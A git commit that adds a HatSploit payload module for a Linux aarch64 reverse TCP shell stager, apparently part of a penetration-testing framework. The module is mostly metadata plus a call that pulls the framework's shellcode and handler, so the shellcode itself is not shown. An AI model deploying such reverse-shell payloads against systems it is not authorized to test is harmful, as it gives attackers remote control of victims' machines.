43900ca318e6bc55db3cc99454d3da8df1c5726f
Ivan Nikolsky <enty8080@gmail.com>
2022-02-11 17:30:07 +0300

    Create shell_reverse_tcp.py

---
+++ hatsploit/payloads/linux/aarch64/shell_reverse_tcp.py
@@ -0,0 +1,33 @@
+#!/usr/bin/env python3
+
+#
+# This payload requires HatSploit: https://hatsploit.netlify.app
+# Current source: https://github.com/EntySec/HatSploit
+#
+
+from hatsploit.lib.payload import Payload
+from hatsploit.utils.payload import PayloadTools
+
+
+class HatSploitPayload(Payload, PayloadTools):
+    details = {
+        'Category': "stager",
+        'Name': "Linux aarch64 Shell Reverse TCP",
+        'Payload': "linux/aarch64/shell_reverse_tcp",
+        'Authors': [
+            'Ivan Nikolsky (enty8080) - payload developer'
+        ],
+        'Description': "Shell reverse TCP payload for Linux aarch64.",
+        'Architecture': "aarch64",
+        'Platform': "linux",
+        'Rank': "high",
+        'Type': "reverse_tcp"
+    }
+
+    def run(self):
+        return self.get_payload(
+            self.details['Platform'],
+            self.details['Architecture'],
+            f"shell_{self.details['Type']}",
+            self.handler
+        )
